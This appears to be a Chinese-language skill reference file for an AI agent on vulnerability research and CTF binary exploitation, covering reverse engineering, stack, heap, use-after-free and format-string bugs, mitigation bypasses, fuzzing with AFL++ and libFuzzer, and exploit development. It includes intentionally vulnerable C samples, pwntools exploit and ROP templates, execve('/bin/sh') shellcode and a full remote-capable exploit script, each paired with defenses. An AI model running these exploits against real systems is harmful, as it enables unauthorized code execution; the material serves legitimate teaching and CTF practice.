---
name: vuln-research
description: 软件安全研究参考。二进制安全分析、内存安全漏洞原理、模糊测试、防护机制验证。用于CTF竞赛、安全研究、软件加固。当用户提到漏洞研究、二进制、逆向、安全分析、Fuzzing、PWN、内存安全时使用。
---

# 赤焰秘典 · 漏洞研究 (Vulnerability Research)

> **软件安全研究参考文档**：本文档为安全研究员提供内存安全漏洞原理、防护机制分析、模糊测试方法。
> 每项漏洞类型均附带防御措施，用于理解攻击原理并指导软件加固。
> 所有示例使用本地测试二进制，不针对未授权目标。


## 研究流程

```
目标分析 → 逆向工程 → 漏洞发现 → Exploit开发 → 报告/披露
    │           │           │           │           │
    └─ 架构 ────┴─ IDA ─────┴─ Fuzz ────┴─ PoC ────┴─ CVE
```

## 逆向工程

### 静态分析
```bash
# 文件信息
file binary
strings binary | grep -i password
readelf -h binary
objdump -d binary

# IDA Pro / Ghidra
# 反汇编、反编译、交叉引用分析
```

### 动态分析
```bash
# GDB 调试
gdb ./binary
(gdb) break main
(gdb) run
(gdb) disas
(gdb) x/20x $esp
(gdb) info registers

# strace/ltrace
strace ./binary
ltrace ./binary

# GDB 增强
# pwndbg / GEF / peda
```

### 常用工具
```yaml
反汇编/反编译:
  - IDA Pro: 商业，最强大
  - Ghidra: 开源，NSA出品
  - Binary Ninja: 现代化
  - Radare2: 开源命令行

调试器:
  - GDB + pwndbg/GEF
  - x64dbg (Windows)
  - WinDbg (Windows内核)
  - LLDB (macOS)

辅助工具:
  - ROPgadget: ROP链构造
  - one_gadget: libc gadget
  - patchelf: ELF修改
  - checksec: 安全机制检查
```

## 漏洞类型

### 栈溢出
```c
// 漏洞代码示例——用于理解溢出原理
void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 无边界检查
}

// 利用思路
// 1. 覆盖返回地址
// 2. 跳转到 shellcode 或 ROP 链
```

```python
# [Security Research] CTF/本地测试用 Exploit 模板
from pwn import *

context.arch = 'amd64'
p = process('./vuln')  # 本地测试二进制

padding = b'A' * 72  # 填充到返回地址
ret_addr = p64(0x401234)  # 目标地址（从反编译获取）

payload = padding + ret_addr
p.sendline(payload)
p.interactive()
```

**防御**：Stack Canary、NX、ASLR、FORTIFY_SOURCE、安全函数（`strncpy`、`snprintf`）

### 堆溢出
```c
// 漏洞代码示例——演示堆溢出覆盖函数指针
struct chunk {
    char data[32];
    void (*func_ptr)();
};

void vulnerable(char *input) {
    struct chunk *c = malloc(sizeof(struct chunk));
    strcpy(c->data, input);  // 溢出覆盖 func_ptr
    c->func_ptr();
}
```

**防御**：堆保护（Safe Unlinking）、ASAN、边界检查、安全分配器

### Use-After-Free
```c
// 漏洞代码示例——演示 UAF 原理
void vulnerable() {
    char *ptr = malloc(64);
    free(ptr);
    // ptr 未置空——悬垂指针
    strcpy(ptr, user_input);  // UAF
}
```

**防御**：free 后置 NULL、智能指针（C++）、ASAN、MTE（ARM）

### 格式化字符串
```c
// 漏洞代码示例
void vulnerable(char *input) {
    printf(input);  // 格式化字符串漏洞
}

// 利用原语
// %x - 泄露栈数据
// %n - 任意写
// %s - 任意读
```

**防御**：始终使用 `printf("%s", input)`、编译器 `-Wformat-security`、FORTIFY_SOURCE

## 保护机制绕过

### 检查保护
```bash
checksec ./binary
# RELRO, Stack Canary, NX, PIE, FORTIFY
```

### 绕过技术
```yaml
# [Security Research] 理解绕过原理是加固防御的前提
NX (不可执行):
  绕过: ROP / ret2libc / ret2syscall
  加固: 确保 NX 全局启用、CFI

ASLR (地址随机化):
  绕过: 信息泄露、暴力破解(32位)、部分覆盖
  加固: 64位 ASLR、PIE、减少信息泄露面

Stack Canary:
  绕过: 信息泄露、逐字节爆破、覆盖 __stack_chk_fail
  加固: 确保全函数启用、SafeStack

PIE (位置无关):
  绕过: 信息泄露基址、部分覆盖
  加固: 配合 ASLR、减少泄露点

RELRO:
  Partial: 可覆盖 GOT
  Full: GOT 只读，需其他利用方式
  加固: 始终使用 Full RELRO
```

### ROP 链构造
```python
# [Security Research] CTF/本地测试用 ROP 模板
from pwn import *

elf = ELF('./vuln')
libc = ELF('./libc.so.6')
rop = ROP(elf)

# 泄露 libc 地址
rop.puts(elf.got['puts'])
rop.main()

# 计算 libc 基址
libc_base = leaked_puts - libc.symbols['puts']
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

# 第二阶段 ROP
rop2 = ROP(libc)
rop2.system(bin_sh)
```

**防御**：CFI（Control Flow Integrity）、Shadow Stack、CET（Intel）、BTI（ARM）

## Fuzzing

### AFL++
```bash
# 编译插桩
afl-gcc -o target_afl target.c

# 准备种子
mkdir input output
echo "seed" > input/seed

# 开始 Fuzz
afl-fuzz -i input -o output -- ./target_afl @@

# 分析崩溃
afl-tmin -i output/crashes/id:000000 -o minimized -- ./target_afl @@
```

### LibFuzzer
```cpp
// fuzz_target.cpp
extern "C" int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {
    // 调用被测函数
    parse_input(data, size);
    return 0;
}
```

```bash
# 编译
clang++ -fsanitize=fuzzer,address fuzz_target.cpp -o fuzzer

# 运行
./fuzzer corpus/
```

### 智能 Fuzzing
```python
# 基于覆盖率的 Fuzzing
# 使用 AFL、LibFuzzer 等

# 基于语法的 Fuzzing
# 使用 Peach、Domato 等

# 符号执行辅助
# 使用 KLEE、angr 等
```

## Exploit 开发

### Shellcode
```python
# [Security Research] pwntools 生成——仅用于 CTF/本地测试
from pwn import *
context.arch = 'amd64'

# 标准 shell shellcode
shellcode = asm(shellcraft.sh())

# 自定义 shellcode（execve("/bin/sh", NULL, NULL)）
shellcode = asm('''
    xor rdi, rdi
    push rdi
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 59
    syscall
''')
```

**防御**：NX、W^X 策略、seccomp 沙箱、shellcode 签名检测

### 完整 Exploit 模板
```python
#!/usr/bin/env python3
# [Security Research] CTF/授权测试用 exploit 模板
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

binary = './vuln'
libc_path = './libc.so.6'
host, port = 'ctf.example.com', 1337  # CTF 平台或授权目标

elf = ELF(binary)
libc = ELF(libc_path)

def exploit(p):
    # 1. 泄露地址
    payload1 = b'A' * 72
    payload1 += p64(elf.plt['puts'])
    payload1 += p64(elf.got['puts'])
    payload1 += p64(elf.symbols['main'])

    p.sendline(payload1)
    leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
    libc_base = leaked - libc.symbols['puts']
    log.success(f"libc base: {hex(libc_base)}")

    # 2. 获取 shell
    system = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    payload2 = b'A' * 72
    payload2 += p64(libc_base + 0x4f3d5)  # one_gadget

    p.sendline(payload2)
    p.interactive()

if __name__ == '__main__':
    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(binary)
    exploit(p)
```

## CTF PWN 技巧

> CTF 竞赛是合法的安全技能训练场景，以下技巧用于竞赛解题。

### 常见题型
```yaml
栈溢出:
  - ret2text: 跳转到后门函数
  - ret2shellcode: 跳转到 shellcode
  - ret2libc: 调用 system("/bin/sh")
  - ROP: 构造 ROP 链

堆利用:
  - fastbin attack
  - unsorted bin attack
  - tcache poisoning
  - house of 系列

格式化字符串:
  - 泄露栈/libc地址
  - 任意写 GOT
  - 修改返回地址
```

### 快速解题流程
```bash
# 1. 检查保护
checksec ./pwn

# 2. 运行测试
./pwn

# 3. 反编译分析（IDA/Ghidra）
# 4. 确定漏洞点
# 5. 编写 Exploit
# 6. 本地测试
# 7. 远程利用（CTF 平台）
```

## 工具清单

| 工具 | 用途 |
|------|------|
| IDA Pro | 反汇编/反编译 |
| Ghidra | 开源逆向 |
| pwntools | Exploit 开发 |
| GDB + pwndbg | 调试 |
| AFL++ | Fuzzing |
| ROPgadget | ROP 链 |
| one_gadget | libc gadget |
| angr | 符号执行 |

---

